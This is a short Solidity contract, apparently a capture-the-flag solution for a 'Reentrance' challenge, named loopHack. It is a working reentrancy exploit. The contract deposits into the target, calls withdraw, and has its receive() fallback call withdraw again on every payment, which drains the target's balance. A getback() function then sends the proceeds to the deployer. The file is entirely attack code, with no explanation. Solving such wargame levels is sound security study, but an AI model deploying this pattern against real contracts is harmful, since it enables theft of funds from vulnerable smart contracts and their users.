// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract loopHack{

    Reentrance public ReentranceContract;
    address payable owner;

    constructor (address payable _ReentranceContract) public payable {
        ReentranceContract = Reentrance(_ReentranceContract);
        owner = msg.sender;
    }

    function Deposit() external payable {
        ReentranceContract.donate{value: 0.001 ether}(address(this));
    }

    function Heist() external{
        ReentranceContract.withdraw(0.001 ether);
    }

    function getback() external payable{
        owner.transfer(address(this).balance);
    }

    receive() external payable {
        ReentranceContract.withdraw(msg.value);
    }
}
